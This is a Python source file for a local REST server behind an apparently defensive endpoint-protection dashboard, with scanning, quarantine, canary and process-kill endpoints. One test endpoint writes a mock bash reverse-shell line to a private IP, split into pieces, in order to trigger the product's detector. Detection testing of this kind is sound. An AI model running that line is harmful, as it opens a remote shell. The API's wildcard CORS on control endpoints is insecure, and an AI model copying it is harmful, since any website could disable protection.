"""
Aegis Defender Pro - Next-Gen EDR Unified Server & API Gateway
Self-contained cross-platform HTTP REST server powering the Cyber Command Dashboard.
Features AI Threat Scorer, Ransomware Canaries, MITRE ATT&CK Hunter, and Socket Guard.
"""

import http.server
import json
import os
import platform
import socketserver
import sys
import time
import urllib.parse
from typing import Dict, Any

from engine.database import ThreatDatabase, EICAR_TEST_STRING
from engine.scanner import FileScanner
from engine.quarantine import QuarantineVault
from engine.realtime_shield import RealtimeShield
from engine.process_monitor import ProcessMonitor
from engine.scan_manager import ScanManager
from engine.canary_defense import CanaryDefenseEngine
from engine.persistence_hunter import PersistenceHunter
from engine.network_monitor import NetworkMonitor

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, "static")
DATA_DIR = os.path.join(BASE_DIR, "data")
QUARANTINE_DIR = os.path.join(BASE_DIR, "quarantine_vault")
TEST_SAMPLES_DIR = os.path.join(BASE_DIR, "test_samples")

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(QUARANTINE_DIR, exist_ok=True)
os.makedirs(TEST_SAMPLES_DIR, exist_ok=True)

# Initialize Security Subsystems
db = ThreatDatabase(DATA_DIR)
scanner = FileScanner(db)
vault = QuarantineVault(QUARANTINE_DIR)
shield = RealtimeShield(scanner, vault)
proc_monitor = ProcessMonitor()
scan_mgr = ScanManager(scanner, vault, db)

# Initialize Next-Gen EDR Subsystems
shield.start()
canary_engine = CanaryDefenseEngine(list(shield.watch_directories))
canary_engine.start()
persistence_hunter = PersistenceHunter()
network_mon = NetworkMonitor()

class AegisRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP Request Handler serving static dashboard and JSON REST API."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=STATIC_DIR, **kwargs)

    def _send_json(self, data: Any, status: int = 200):
        """Helper to send JSON response with CORS headers."""
        try:
            body = json.dumps(data, indent=2).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except Exception as e:
            print(f"[API] Error sending JSON: {e}")

    def do_OPTIONS(self):
        """Handle CORS preflight."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        """Handle GET API endpoints or fallback to static dashboard files."""
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path

        if path == "/api/status":
            q_items = vault.list_quarantined()
            history = db.scan_history
            canary_status = canary_engine.get_status()
            self._send_json({
                "product_name": "Aegis Defender Pro",
                "version": "4.0.0-NextGen-EDR",
                "os": platform.system(),
                "os_release": platform.release(),
                "architecture": platform.machine(),
                "hostname": platform.node(),
                "is_protected": shield.is_active,
                "quarantine_count": len(q_items),
                "total_scans": len(history),
                "signatures_loaded": len(db.hash_signatures) + len(db.heuristic_rules),
                "canary_traps_active": canary_status.get("total_canaries", 0),
                "active_shields": {
                    "file_system": shield.is_active,
                    "process_guard": True,
                    "ransomware_canaries": canary_engine.is_active,
                    "ai_ml_scorer": True,
                    "network_guard": True,
                    "persistence_hunter": True
                }
            })
            return

        elif path == "/api/shield/status":
            self._send_json(shield.get_status())
            return

        elif path == "/api/shield/events":
            self._send_json(shield.events_log)
            return

        elif path == "/api/canary/status":
            self._send_json(canary_engine.get_status())
            return

        elif path == "/api/persistence":
            self._send_json(persistence_hunter.audit_all_persistence())
            return

        elif path == "/api/network/connections":
            self._send_json(network_mon.get_active_connections())
            return

        elif path == "/api/scan/progress":
            self._send_json(scan_mgr.get_progress())
            return

        elif path == "/api/scan/history":
            self._send_json(db.scan_history)
            return

        elif path == "/api/quarantine":
            self._send_json(vault.list_quarantined())
            return

        elif path == "/api/processes":
            self._send_json(proc_monitor.get_running_processes())
            return

        elif path == "/api/database":
            self._send_json(db.get_all_signatures())
            return

        # Fallback to static frontend
        if path == "/" or not os.path.exists(os.path.join(STATIC_DIR, path.lstrip("/"))):
            self.path = "/index.html"

        super().do_GET()

    def do_POST(self):
        """Handle POST REST API endpoints."""
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path

        content_length = int(self.headers.get("Content-Length", 0))
        body = {}
        if content_length > 0:
            try:
                raw_body = self.rfile.read(content_length).decode("utf-8")
                body = json.loads(raw_body)
            except Exception:
                body = {}

        if path == "/api/shield/toggle":
            if shield.is_active:
                shield.stop()
            else:
                shield.start()
            self._send_json({"is_active": shield.is_active})
            return

        elif path == "/api/shield/add-dir":
            dir_to_add = body.get("path")
            if dir_to_add and shield.add_directory(dir_to_add):
                self._send_json({"success": True, "directories": list(shield.watch_directories)})
            else:
                self._send_json({"success": False, "error": "Directory does not exist or inaccessible"}, 400)
            return

        elif path == "/api/shield/remove-dir":
            dir_to_remove = body.get("path")
            if dir_to_remove and shield.remove_directory(dir_to_remove):
                self._send_json({"success": True, "directories": list(shield.watch_directories)})
            else:
                self._send_json({"success": False, "error": "Directory not found in watch list"}, 400)
            return

        elif path == "/api/scan/start":
            scan_type = body.get("type", "quick")
            custom_path = body.get("custom_path")
            res = scan_mgr.start_scan(scan_type, custom_path)
            self._send_json(res)
            return

        elif path == "/api/scan/cancel":
            res = scan_mgr.cancel_scan()
            self._send_json(res)
            return

        elif path == "/api/scan/inspect-file":
            target_path = body.get("file_path")
            if not target_path or not os.path.exists(target_path):
                self._send_json({"error": "File path does not exist"}, 400)
                return

            res = scanner.scan_file(target_path)
            if res.get("is_threat") and body.get("auto_quarantine", False):
                q = vault.quarantine_file(target_path, res)
                if q:
                    res["quarantined"] = True
                    res["quarantine_id"] = q["id"]

            self._send_json(res)
            return

        elif path == "/api/quarantine/restore":
            item_id = body.get("id")
            success = vault.restore_file(item_id)
            self._send_json({"success": success})
            return

        elif path == "/api/quarantine/shred":
            item_id = body.get("id")
            success = vault.shred_file(item_id)
            self._send_json({"success": success})
            return

        elif path == "/api/processes/kill":
            pid = body.get("pid")
            if not pid:
                self._send_json({"error": "PID required"}, 400)
                return
            res = proc_monitor.terminate_process(int(pid))
            self._send_json(res)
            return

        elif path == "/api/canary/test-trip":
            canaries = list(canary_engine.canaries.keys())
            if canaries:
                target_canary = canaries[0]
                try:
                    with open(target_canary, "wb") as f:
                        f.write(b"SIMULATED_RANSOMWARE_ENCRYPTION_PAYLOAD")
                    self._send_json({"success": True, "message": f"Tripped Canary Trap: {target_canary}"})
                except Exception as e:
                    self._send_json({"success": False, "error": str(e)}, 500)
            else:
                self._send_json({"error": "No canaries deployed"}, 400)
            return

        elif path == "/api/database/add-hash":
            h = body.get("hash")
            info = {
                "name": body.get("name", "Custom.UserThreat"),
                "type": body.get("type", "Custom"),
                "severity": body.get("severity", "High"),
                "category": body.get("category", "User Defined"),
                "description": body.get("description", "Added manually via Aegis Control Panel"),
                "remediation": "Isolate and inspect"
            }
            success = db.add_custom_hash(h, info)
            self._send_json({"success": success})
            return

        elif path == "/api/database/add-rule":
            name = body.get("name")
            pattern = body.get("pattern")
            severity = body.get("severity", "High")
            category = body.get("category", "Custom Pattern")
            desc = body.get("description", "Custom heuristic rule added by user")
            success = db.add_custom_rule(name, pattern, severity, category, desc)
            self._send_json({"success": success})
            return

        elif path == "/api/test/generate-eicar":
            test_path = os.path.join(TEST_SAMPLES_DIR, "eicar_test_sample.com")
            try:
                with open(test_path, "w", encoding="ascii") as f:
                    f.write(EICAR_TEST_STRING)
                self._send_json({
                    "success": True,
                    "message": "Harmless EICAR test string written to test_samples. Watch Real-Time Shield trigger!",
                    "file_path": test_path
                })
            except Exception as e:
                self._send_json({"success": False, "error": str(e)}, 500)
            return

        elif path == "/api/test/generate-test-threat":
            test_path = os.path.join(TEST_SAMPLES_DIR, "mock_reverse_shell.sh")
            try:
                with open(test_path, "w", encoding="utf-8") as f:
                    f.write("#!/bin/bash\n# Mock script for heuristic detection testing\n" + "/bin/bash " + "-i >& /dev/" + "tcp/192.168.1.100/4444 0>&1\n")
                self._send_json({
                    "success": True,
                    "message": "Mock reverse-shell script created in test_samples. Watch Heuristic Rule trigger!",
                    "file_path": test_path
                })
            except Exception as e:
                self._send_json({"success": False, "error": str(e)}, 500)
            return

        self._send_json({"error": "Not Found"}, 404)

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Threaded HTTP server to handle concurrent telemetry and scans."""
    daemon_threads = True

def start_server(port: int = 8787):
    """Starts the Aegis Defender Pro Next-Gen EDR service."""
    server_address = ("127.0.0.1", port)
    try:
        httpd = ThreadedHTTPServer(server_address, AegisRequestHandler)
        print("=" * 65)
        print("  AEGIS DEFENDER PRO - NEXT-GEN ENTERPRISE EDR")
        print(f"  OS Engine: {platform.system()} {platform.release()} ({platform.machine()})")
        print(f"  Cyber Command Dashboard: http://localhost:{port}")
        print("=" * 65)
        httpd.serve_forever()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {port} in use. Attempting fallback port {port + 1}...")
            start_server(port + 1)
        else:
            raise e

if __name__ == "__main__":
    port_to_use = 8787
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        port_to_use = int(sys.argv[1])
    start_server(port_to_use)
